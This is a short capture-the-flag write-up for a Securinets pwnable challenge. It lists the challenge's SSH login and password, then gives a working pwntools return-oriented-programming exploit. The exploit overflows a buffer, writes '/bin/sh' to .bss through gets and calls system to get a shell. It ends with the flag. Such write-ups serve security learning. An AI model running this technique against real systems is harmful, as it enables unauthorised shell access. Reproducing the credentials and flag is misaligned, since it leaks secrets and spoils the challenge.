# **back to basics**

#### tag : pwnable, rop

-----------------------------------------------

#### Description

>ssh basic@51.254.114.246
>password : 8eb95121d4f226dec59b98abd5c77a10
>
>Author : Anis_Boss & KERRO

-----------------------------------------------

#### Solution

```python
from pwn import *

context.arch = 'amd64'

r = process('/home/basic/basic')

system_plt = 0x4004f0
gets_plt = 0x400520
bss = 0x60107b

# pop rdi; ret;
gg1 = 0x400743

p = 'a' * 0x98
p += flat(
	gg1,
	bss,
	gets_plt,
	gg1,
	bss,
	system_plt
)

r.send(p)
r.sendline('/bin/sh\x00')
r.interactive()
```
**securinets{ed_for_the_win}**
